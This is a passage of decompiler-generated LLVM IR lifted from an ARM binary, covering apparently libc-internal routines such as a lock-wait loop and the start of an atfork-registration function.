bb74:                                             ; preds = %dec_label_pc_1d620, %bb73
  %v1_1d628 = xor i1 %v9_1d620, true
  call void @__pseudo_cond_branch(i1 %v1_1d628, i32 ptrtoint (i32* @global_var_1d8a0.575 to i32))
  %v0_1d62c = load i32, i32* %r5.global-to-local, align 4
  %v1_1d62c = load i32, i32* %r7.global-to-local, align 4
  %v2_1d62c = add i32 %v1_1d62c, 8
  %v3_1d62c = inttoptr i32 %v2_1d62c to i32*
  store i32 %v0_1d62c, i32* %v3_1d62c, align 4
  br label %dec_label_pc_1d750

dec_label_pc_1d750:                               ; preds = %bb74, %dec_label_pc_1d5d4
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_1d634 = load i32, i32* %r8.global-to-local, align 4
  %v2_1d634 = add i32 %v0_1d634, 152
  %v3_1d634 = inttoptr i32 %v2_1d634 to i32*
  %v4_1d634 = load i32, i32* %v3_1d634, align 4
  store i32 %v4_1d634, i32* %r2.global-to-local, align 4
  %v1_1d638 = add i32 %v4_1d634, 4
  %v2_1d638 = inttoptr i32 %v1_1d638 to i32*
  %v3_1d638 = load i32, i32* %v2_1d638, align 4
  %v1_1d63c = add i32 %v3_1d638, 1
  store i32 %v1_1d63c, i32* %r3.global-to-local, align 4
  store i32 %v1_1d63c, i32* %v2_1d638, align 4
  %v0_1d644 = load i32, i32* %r5.global-to-local, align 4
  %v1_1d644 = add i32 %v0_1d644, 108
  %v2_1d644 = inttoptr i32 %v1_1d644 to i32*
  %v3_1d644 = load i32, i32* %v2_1d644, align 4
  store i32 %v3_1d644, i32* %sl.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  %v1_1d64c = sub i32 0, %v3_1d644
  store i32 %v1_1d64c, i32* %v2_1d644, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_1d660 = load i32, i32* %r5.global-to-local, align 4
  %v1_1d660 = add i32 %v0_1d660, 104
  store i32 %v1_1d660, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_1d754.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_1d754 = add i32 %v0_1d660, 108
  %v3_1d754 = inttoptr i32 %v2_1d754 to i32*
  store i32 %v0_1d754.pre, i32* %v3_1d754, align 4
  %v0_1d758 = load i32, i32* %r8.global-to-local, align 4
  %v1_1d758 = load i32, i32* %r3.global-to-local, align 4
  %v2_1d758 = add i32 %v1_1d758, %v0_1d758
  %v3_1d758 = inttoptr i32 %v2_1d758 to i32*
  %v4_1d758 = load i32, i32* %v3_1d758, align 4
  store i32 %v4_1d758, i32* %r0.global-to-local, align 4
  %v1_1d75c = add i32 %v4_1d758, 4
  %v2_1d75c = inttoptr i32 %v1_1d75c to i32*
  %v3_1d75c = load i32, i32* %v2_1d75c, align 4
  %v1_1d760 = add i32 %v3_1d75c, -1
  store i32 %v1_1d760, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d764 = icmp eq i32 %v1_1d760, 0
  store i32 %v1_1d760, i32* %v2_1d75c, align 4
  br i1 %v2_1d764, label %dec_label_pc_1d770, label %dec_label_pc_1d860thread-pre-split

dec_label_pc_1d770:                               ; preds = %dec_label_pc_1d750
  %v0_1d770 = load i32, i32* %r3.global-to-local, align 4
  %v1_1d770 = load i32, i32* %r0.global-to-local, align 4
  %v2_1d770 = add i32 %v1_1d770, 8
  %v3_1d770 = inttoptr i32 %v2_1d770 to i32*
  store i32 %v0_1d770, i32* %v3_1d770, align 4
  %v0_1d774 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1d774, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1d778

dec_label_pc_1d778:                               ; preds = %dec_label_pc_1d7a8.dec_label_pc_1d778_crit_edge, %dec_label_pc_1d770
  %v0_1d778 = phi i32 [ %v0_1d778.pre, %dec_label_pc_1d7a8.dec_label_pc_1d778_crit_edge ], [ %v0_1d774, %dec_label_pc_1d770 ]
  %v1_1d778 = inttoptr i32 %v0_1d778 to i32*
  %v2_1d778 = load i32, i32* %v1_1d778, align 4
  store i32 %v2_1d778, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_1d778, i32* %r2.global-to-local, align 4
  %v2_1d784100 = load i32, i32* %v1_1d778, align 4
  store i32 %v2_1d784100, i32* %r3.global-to-local, align 4
  %v3_1d788102 = icmp uge i32 %v2_1d784100, %v2_1d778
  store i1 %v3_1d788102, i1* %cpsr_c.global-to-local, align 1
  %v9_1d788108 = icmp eq i32 %v2_1d784100, %v2_1d778
  br i1 %v9_1d788108, label %dec_label_pc_1d790, label %dec_label_pc_1d7a8

dec_label_pc_1d790:                               ; preds = %dec_label_pc_1d778, %dec_label_pc_1d790.dec_label_pc_1d784_crit_edge
  %v0_1d790109 = phi i32 [ %v1_1d788.pre, %dec_label_pc_1d790.dec_label_pc_1d784_crit_edge ], [ %v2_1d778, %dec_label_pc_1d778 ]
  store i32 %v0_1d790109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1d7a0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1d7a0, label %dec_label_pc_1d7a4, label %dec_label_pc_1d790.dec_label_pc_1d784_crit_edge

dec_label_pc_1d790.dec_label_pc_1d784_crit_edge:  ; preds = %dec_label_pc_1d790
  %v0_1d784.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1d788.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1d784 = inttoptr i32 %v0_1d784.pre to i32*
  %v2_1d784 = load i32, i32* %v1_1d784, align 4
  store i32 %v2_1d784, i32* %r3.global-to-local, align 4
  %v3_1d788 = icmp uge i32 %v2_1d784, %v1_1d788.pre
  store i1 %v3_1d788, i1* %cpsr_c.global-to-local, align 1
  %v9_1d788 = icmp eq i32 %v2_1d784, %v1_1d788.pre
  br i1 %v9_1d788, label %dec_label_pc_1d790, label %dec_label_pc_1d7a8

dec_label_pc_1d7a4:                               ; preds = %dec_label_pc_1d790
  %v0_1d7a4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1d7a4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1d7a8

dec_label_pc_1d7a8:                               ; preds = %dec_label_pc_1d778, %dec_label_pc_1d790.dec_label_pc_1d784_crit_edge, %dec_label_pc_1d7a4
  %v0_1d7b0 = phi i32 [ %v0_1d7a4, %dec_label_pc_1d7a4 ], [ %v2_1d784100, %dec_label_pc_1d778 ], [ %v2_1d784, %dec_label_pc_1d790.dec_label_pc_1d784_crit_edge ]
  %v1_1d7a8 = phi i32 [ %v0_1d7a4, %dec_label_pc_1d7a4 ], [ %v2_1d778, %dec_label_pc_1d778 ], [ %v1_1d788.pre, %dec_label_pc_1d790.dec_label_pc_1d784_crit_edge ]
  %v3_1d7a8 = icmp uge i32 %v0_1d7b0, %v1_1d7a8
  store i1 %v3_1d7a8, i1* %cpsr_c.global-to-local, align 1
  %v9_1d7a8 = icmp eq i32 %v0_1d7b0, %v1_1d7a8
  br i1 %v9_1d7a8, label %dec_label_pc_1d7b0, label %dec_label_pc_1d7a8.dec_label_pc_1d778_crit_edge

dec_label_pc_1d7a8.dec_label_pc_1d778_crit_edge:  ; preds = %dec_label_pc_1d7a8
  %v0_1d778.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1d778

dec_label_pc_1d7b0:                               ; preds = %dec_label_pc_1d7a8
  %v2_1d7b0 = icmp ne i32 %v1_1d7a8, 0
  store i1 %v2_1d7b0, i1* %cpsr_c.global-to-local, align 1
  %v7_1d7b4 = icmp slt i32 %v1_1d7a8, 2
  br i1 %v7_1d7b4, label %dec_label_pc_1d860thread-pre-split, label %dec_label_pc_1d7b8

dec_label_pc_1d7b8:                               ; preds = %dec_label_pc_1d7b0
  %v0_1d7b8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1d7b8, i32* %r0.global-to-local, align 4
  %v0_1d7bc = load i32, i32* @r1, align 4
  %v1_1d7bc = add i32 %v0_1d7bc, 129
  store i32 %v1_1d7bc, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1d860thread-pre-split

dec_label_pc_1d7d4:                               ; preds = %dec_label_pc_1d860thread-pre-split, %dec_label_pc_1d85c
  %v0_1d7d4 = phi i32 [ %v3_1d85c, %dec_label_pc_1d85c ], [ %v0_1d860.pr, %dec_label_pc_1d860thread-pre-split ]
  %v1_1d7d4 = inttoptr i32 %v0_1d7d4 to i32*
  %v2_1d7d4 = load i32, i32* %v1_1d7d4, align 4
  store i32 %v2_1d7d4, i32* %r3.global-to-local, align 4
  %v1_1d7d8 = add i32 %v2_1d7d4, 8
  %v2_1d7d8 = inttoptr i32 %v1_1d7d8 to i32*
  %v3_1d7d8 = load i32, i32* %v2_1d7d8, align 4
  store i32 %v3_1d7d8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d7dc = icmp eq i32 %v3_1d7d8, 0
  br i1 %v2_1d7dc, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_1d7d4
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_1d7d4, %bb75
  %v2_1d7e4 = xor i1 %v2_1d7dc, true
  call void @__pseudo_cond_branch(i1 %v2_1d7e4, i32 %v3_1d7d8)
  %v0_1d7e8 = load i32, i32* %r6.global-to-local, align 4
  %v1_1d7e8 = inttoptr i32 %v0_1d7e8 to i32*
  %v2_1d7e8 = load i32, i32* %v1_1d7e8, align 4
  store i32 %v2_1d7e8, i32* %r5.global-to-local, align 4
  %v1_1d7ec = add i32 %v2_1d7e8, 20
  store i32 %v1_1d7ec, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1d7f0

dec_label_pc_1d7f0:                               ; preds = %dec_label_pc_1d824.dec_label_pc_1d7f0_crit_edge, %bb76
  %v0_1d7f4 = phi i32 [ %v0_1d7f4.pre, %dec_label_pc_1d824.dec_label_pc_1d7f0_crit_edge ], [ %v1_1d7ec, %bb76 ]
  %v0_1d7f0 = phi i32 [ %v0_1d7f0.pre, %dec_label_pc_1d824.dec_label_pc_1d7f0_crit_edge ], [ %v2_1d7e8, %bb76 ]
  %v1_1d7f0 = add i32 %v0_1d7f0, 20
  %v2_1d7f0 = inttoptr i32 %v1_1d7f0 to i32*
  %v3_1d7f0 = load i32, i32* %v2_1d7f0, align 4
  store i32 %v0_1d7f4, i32* %r2.global-to-local, align 4
  store i32 %v3_1d7f0, i32* %r4.global-to-local, align 4
  %v1_1d7fc = add i32 %v3_1d7f0, -1
  store i32 %v1_1d7fc, i32* @r1, align 4
  %v1_1d80087 = inttoptr i32 %v0_1d7f4 to i32*
  %v2_1d80088 = load i32, i32* %v1_1d80087, align 4
  store i32 %v2_1d80088, i32* %r3.global-to-local, align 4
  %v3_1d80490 = icmp uge i32 %v2_1d80088, %v3_1d7f0
  store i1 %v3_1d80490, i1* %cpsr_c.global-to-local, align 1
  %v9_1d80496 = icmp eq i32 %v2_1d80088, %v3_1d7f0
  br i1 %v9_1d80496, label %dec_label_pc_1d80c, label %dec_label_pc_1d824

dec_label_pc_1d80c:                               ; preds = %dec_label_pc_1d7f0, %dec_label_pc_1d80c.dec_label_pc_1d800_crit_edge
  %v0_1d80c97 = phi i32 [ %v1_1d804.pre, %dec_label_pc_1d80c.dec_label_pc_1d800_crit_edge ], [ %v3_1d7f0, %dec_label_pc_1d7f0 ]
  store i32 %v0_1d80c97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1d81c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1d81c, label %dec_label_pc_1d820, label %dec_label_pc_1d80c.dec_label_pc_1d800_crit_edge

dec_label_pc_1d80c.dec_label_pc_1d800_crit_edge:  ; preds = %dec_label_pc_1d80c
  %v0_1d800.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1d804.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1d800 = inttoptr i32 %v0_1d800.pre to i32*
  %v2_1d800 = load i32, i32* %v1_1d800, align 4
  store i32 %v2_1d800, i32* %r3.global-to-local, align 4
  %v3_1d804 = icmp uge i32 %v2_1d800, %v1_1d804.pre
  store i1 %v3_1d804, i1* %cpsr_c.global-to-local, align 1
  %v9_1d804 = icmp eq i32 %v2_1d800, %v1_1d804.pre
  br i1 %v9_1d804, label %dec_label_pc_1d80c, label %dec_label_pc_1d824

dec_label_pc_1d820:                               ; preds = %dec_label_pc_1d80c
  %v0_1d820 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1d820, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1d824

dec_label_pc_1d824:                               ; preds = %dec_label_pc_1d7f0, %dec_label_pc_1d80c.dec_label_pc_1d800_crit_edge, %dec_label_pc_1d820
  %v0_1d830 = phi i32 [ %v0_1d820, %dec_label_pc_1d820 ], [ %v2_1d80088, %dec_label_pc_1d7f0 ], [ %v2_1d800, %dec_label_pc_1d80c.dec_label_pc_1d800_crit_edge ]
  %v1_1d824 = phi i32 [ %v0_1d820, %dec_label_pc_1d820 ], [ %v3_1d7f0, %dec_label_pc_1d7f0 ], [ %v1_1d804.pre, %dec_label_pc_1d80c.dec_label_pc_1d800_crit_edge ]
  %v3_1d824 = icmp uge i32 %v0_1d830, %v1_1d824
  store i1 %v3_1d824, i1* %cpsr_c.global-to-local, align 1
  %v9_1d824 = icmp eq i32 %v0_1d830, %v1_1d824
  store i32 %v0_1d830, i32* %r2.global-to-local, align 4
  br i1 %v9_1d824, label %dec_label_pc_1d830, label %dec_label_pc_1d824.dec_label_pc_1d7f0_crit_edge

dec_label_pc_1d824.dec_label_pc_1d7f0_crit_edge:  ; preds = %dec_label_pc_1d824
  %v0_1d7f0.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1d7f4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1d7f0

dec_label_pc_1d830:                               ; preds = %dec_label_pc_1d824
  %v2_1d830 = icmp ne i32 %v1_1d824, 0
  store i1 %v2_1d830, i1* %cpsr_c.global-to-local, align 1
  %v7_1d830 = icmp eq i32 %v1_1d824, 1
  %v0_1d838 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_1d830, label %dec_label_pc_1d838, label %dec_label_pc_1d85c

dec_label_pc_1d838:                               ; preds = %dec_label_pc_1d830
  %v1_1d838 = inttoptr i32 %v0_1d838 to i32*
  %v2_1d838 = load i32, i32* %v1_1d838, align 4
  store i32 %v2_1d838, i32* @r1, align 4
  %v1_1d83c = add i32 %v2_1d838, 24
  %v2_1d83c = inttoptr i32 %v1_1d83c to i32*
  %v3_1d83c = load i32, i32* %v2_1d83c, align 4
  store i32 %v3_1d83c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d840 = icmp eq i32 %v3_1d83c, 0
  br i1 %v2_1d840, label %dec_label_pc_1d85c, label %dec_label_pc_1d848

dec_label_pc_1d848:                               ; preds = %dec_label_pc_1d838
  %v1_1d848 = add i32 %v2_1d838, 20
  %v2_1d848 = inttoptr i32 %v1_1d848 to i32*
  %v3_1d848 = load i32, i32* %v2_1d848, align 4
  store i32 %v3_1d848, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1d85c

dec_label_pc_1d85c:                               ; preds = %dec_label_pc_1d830, %dec_label_pc_1d848, %dec_label_pc_1d838
  %v1_1d85c = add i32 %v0_1d838, 4
  %v2_1d85c = inttoptr i32 %v1_1d85c to i32*
  %v3_1d85c = load i32, i32* %v2_1d85c, align 4
  store i32 %v3_1d85c, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d860 = icmp eq i32 %v3_1d85c, 0
  br i1 %v2_1d860, label %dec_label_pc_1d868, label %dec_label_pc_1d7d4

dec_label_pc_1d860thread-pre-split:               ; preds = %dec_label_pc_1d7b8, %dec_label_pc_1d7b0, %dec_label_pc_1d750
  %v0_1d860.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d86011 = icmp eq i32 %v0_1d860.pr, 0
  br i1 %v2_1d86011, label %dec_label_pc_1d868, label %dec_label_pc_1d7d4

dec_label_pc_1d868:                               ; preds = %dec_label_pc_1d85c, %dec_label_pc_1d860thread-pre-split
  %v0_1d868.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1d868.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_1d868.pre

; uselistorder directives
  uselistorder i32 %v0_1d860.pr, { 1, 0 }
  uselistorder i32 %v3_1d85c, { 1, 2, 0 }
  uselistorder i32 %v1_1d824, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1d820, { 1, 0, 2 }
  uselistorder i32 %v1_1d804.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1d7a4, { 1, 0, 2 }
  uselistorder i32 %v1_1d788.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1d778, { 1, 0 }
  uselistorder i32 %v0_1d61c, { 1, 0, 2 }
  uselistorder i32 %v1_1d600.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_1d5d8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1d5b0, { 1, 0, 2 }
  uselistorder i32 %v1_1d594.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_1d55c, { 1, 0, 2 }
  uselistorder i32 %v0_1d53c, { 1, 0, 2 }
  uselistorder i32 %v1_1d520.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 14, 13, 0 }
  uselistorder i32* %r6.global-to-local, { 6, 0, 4, 5, 7, 1, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 9, 10, 12, 11, 13, 14, 16, 15, 17 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 7, 9, 8, 0, 10, 11, 12, 13, 15, 14, 1, 16, 17, 18, 19, 20, 21, 22, 24, 23, 2, 25, 26, 27, 29, 28, 3, 30, 31, 33, 32, 4, 34 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 13, 7, 8, 9, 11, 10, 2, 12, 14, 15, 17, 16, 3, 18, 19, 21, 20, 4, 22, 23, 25, 24, 5, 26, 27, 28, 30, 29, 6, 32, 31, 1 }
  uselistorder i32 108, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1d868, { 1, 0 }
  uselistorder label %dec_label_pc_1d85c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1d824, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1d80c, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_1d7a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1d790, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_1d620, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1d608, { 1, 0 }
  uselistorder label %dec_label_pc_1d5b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1d59c, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_1d540, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1d528, { 1, 0 }
  uselistorder label %dec_label_pc_1d5c4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1d4f4, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1d8a0 = load i32, i32* @r4, align 4
  store i32 %v3_1d8a0, i32* %stack_var_-16, align 4
  %v0_1d8a4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1d8a4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1d8a8

dec_label_pc_1d8a8:                               ; preds = %dec_label_pc_1d928.dec_label_pc_1d8a8_crit_edge, %entry
  %v0_1d8ac = phi i32 [ %v0_1d8ac.pre, %dec_label_pc_1d928.dec_label_pc_1d8a8_crit_edge ], [ %v0_1d8a4, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_1d8ac, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_1d8b417 = inttoptr i32 %v0_1d8ac to i32*
  %v2_1d8b418 = load i32, i32* %v1_1d8b417, align 4
  %v3_1d8b820 = icmp ne i32 %v2_1d8b418, 0
  store i1 %v3_1d8b820, i1* %cpsr_c.global-to-local, align 1
  %v9_1d8b826 = icmp eq i32 %v2_1d8b418, 1
  br i1 %v9_1d8b826, label %dec_label_pc_1d8c0, label %dec_label_pc_1d8d8

dec_label_pc_1d8c0:                               ; preds = %dec_label_pc_1d8a8, %dec_label_pc_1d8c0.dec_label_pc_1d8b4_crit_edge
  %v0_1d8c027 = phi i32 [ %v1_1d8b8.pre, %dec_label_pc_1d8c0.dec_label_pc_1d8b4_crit_edge ], [ 1, %dec_label_pc_1d8a8 ]
  store i32 %v0_1d8c027, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1d8d0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1d8d0, label %dec_label_pc_1d8d4, label %dec_label_pc_1d8c0.dec_label_pc_1d8b4_crit_edge

dec_label_pc_1d8c0.dec_label_pc_1d8b4_crit_edge:  ; preds = %dec_label_pc_1d8c0
  %v0_1d8b4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1d8b8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1d8b4 = inttoptr i32 %v0_1d8b4.pre to i32*
  %v2_1d8b4 = load i32, i32* %v1_1d8b4, align 4
  %v3_1d8b8 = icmp uge i32 %v2_1d8b4, %v1_1d8b8.pre
  store i1 %v3_1d8b8, i1* %cpsr_c.global-to-local, align 1
  %v9_1d8b8 = icmp eq i32 %v2_1d8b4, %v1_1d8b8.pre
  br i1 %v9_1d8b8, label %dec_label_pc_1d8c0, label %dec_label_pc_1d8d8

dec_label_pc_1d8d4:                               ; preds = %dec_label_pc_1d8c0
  %v0_1d8d4 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1d8d8

dec_label_pc_1d8d8:                               ; preds = %dec_label_pc_1d8a8, %dec_label_pc_1d8c0.dec_label_pc_1d8b4_crit_edge, %dec_label_pc_1d8d4
  %v0_1d8d8 = phi i32 [ %v0_1d8d4, %dec_label_pc_1d8d4 ], [ %v2_1d8b418, %dec_label_pc_1d8a8 ], [ %v2_1d8b4, %dec_label_pc_1d8c0.dec_label_pc_1d8b4_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d8d8 = icmp eq i32 %v0_1d8d8, 0
  %v0_1d8fc.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_1d8d8, label %dec_label_pc_1d8f8, label %dec_label_pc_1d8e0

dec_label_pc_1d8e0:                               ; preds = %dec_label_pc_1d8d8
  store i32 %v0_1d8fc.pre, i32* %r0.global-to-local, align 4
  %v0_1d8e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1d8e4 = add i32 %v0_1d8e4, 126
  store i32 %v1_1d8e4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1d8f8

dec_label_pc_1d8f8:                               ; preds = %dec_label_pc_1d8d8, %dec_label_pc_1d8e0
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_1d8fc.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1d90428 = inttoptr i32 %v0_1d8fc.pre to i32*
  %v2_1d90429 = load i32, i32* %v1_1d90428, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1d90836 = icmp eq i32 %v2_1d90429, 0
  br i1 %v9_1d90836, label %dec_label_pc_1d910, label %dec_label_pc_1d928

dec_label_pc_1d910:                               ; preds = %dec_label_pc_1d8f8, %dec_label_pc_1d910.dec_label_pc_1d904_crit_edge
  %v0_1d91037 = phi i32 [ %v1_1d908.pre, %dec_label_pc_1d910.dec_label_pc_1d904_crit_edge ], [ 0, %dec_label_pc_1d8f8 ]
  store i32 %v0_1d91037, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1d920 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1d920, label %dec_label_pc_1d924, label %dec_label_pc_1d910.dec_label_pc_1d904_crit_edge

dec_label_pc_1d910.dec_label_pc_1d904_crit_edge:  ; preds = %dec_label_pc_1d910
  %v0_1d904.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1d908.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1d904 = inttoptr i32 %v0_1d904.pre to i32*
  %v2_1d904 = load i32, i32* %v1_1d904, align 4
  %v3_1d908 = icmp uge i32 %v2_1d904, %v1_1d908.pre
  store i1 %v3_1d908, i1* %cpsr_c.global-to-local, align 1
  %v9_1d908 = icmp eq i32 %v2_1d904, %v1_1d908.pre
  br i1 %v9_1d908, label %dec_label_pc_1d910, label %dec_label_pc_1d928

dec_label_pc_1d924:                               ; preds = %dec_label_pc_1d910
  %v0_1d924 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1d928

dec_label_pc_1d928:                               ; preds = %dec_label_pc_1d8f8, %dec_label_pc_1d910.dec_label_pc_1d904_crit_edge, %dec_label_pc_1d924
  %v0_1d928 = phi i32 [ %v0_1d924, %dec_label_pc_1d924 ], [ %v2_1d90429, %dec_label_pc_1d8f8 ], [ %v2_1d904, %dec_label_pc_1d910.dec_label_pc_1d904_crit_edge ]
  %v1_1d928 = phi i32 [ %v0_1d924, %dec_label_pc_1d924 ], [ 0, %dec_label_pc_1d8f8 ], [ %v1_1d908.pre, %dec_label_pc_1d910.dec_label_pc_1d904_crit_edge ]
  %v3_1d928 = icmp uge i32 %v0_1d928, %v1_1d928
  store i1 %v3_1d928, i1* %cpsr_c.global-to-local, align 1
  %v9_1d928 = icmp eq i32 %v0_1d928, %v1_1d928
  br i1 %v9_1d928, label %dec_label_pc_1d930, label %dec_label_pc_1d928.dec_label_pc_1d8a8_crit_edge

dec_label_pc_1d928.dec_label_pc_1d8a8_crit_edge:  ; preds = %dec_label_pc_1d928
  %v0_1d8ac.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1d8a8

dec_label_pc_1d930:                               ; preds = %dec_label_pc_1d928
  %v2_1d930 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1d930, i32* %r4.global-to-local, align 4
  %v1_1d934 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1d934

; uselistorder directives
  uselistorder i32 %v0_1d924, { 1, 0 }
  uselistorder i32 %v1_1d908.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1d8b8.pre, { 2, 1, 0 }
  uselistorder i32 %v2_1d8b418, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 4, 3, 1, 5, 7, 6, 0 }
  uselistorder label %dec_label_pc_1d928, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1d910, { 1, 0 }
  uselistorder label %dec_label_pc_1d8f8, { 1, 0 }
  uselistorder label %dec_label_pc_1d8d8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1d8c0, { 1, 0 }
}

define i32 @__linkin_atfork(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1d938 = load i32, i32* @r4, align 4
  store i32 %v3_1d938, i32* %stack_var_-24, align 4
  store i32 14004, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r5.global-to-local, align 4
  %v0_1d948 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1d948, i32* %r6.global-to-local, align 4
